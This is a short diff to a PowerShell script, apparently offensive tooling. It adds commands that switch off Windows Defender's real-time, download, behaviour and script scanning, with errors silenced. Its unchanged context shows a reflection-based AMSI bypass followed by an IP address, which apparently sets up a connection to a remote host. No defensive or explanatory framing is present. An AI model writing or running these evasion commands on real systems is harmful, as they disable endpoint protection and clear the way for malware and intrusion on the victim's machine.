@@ -1,3 +1,7 @@
+Set-MpPreference -DisableRealtimeMonitoring $true -ea 0; 
+Set-MpPreference -DisableIOAVProtection $true -ea 0; 
+Set-MpPreference -DisableBehaviorMonitoring $true -ea 0; Set-MpPreference -DisableScriptScanning $true -ea 0;
+
 $null=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 
 $ip='172.20.10.2'
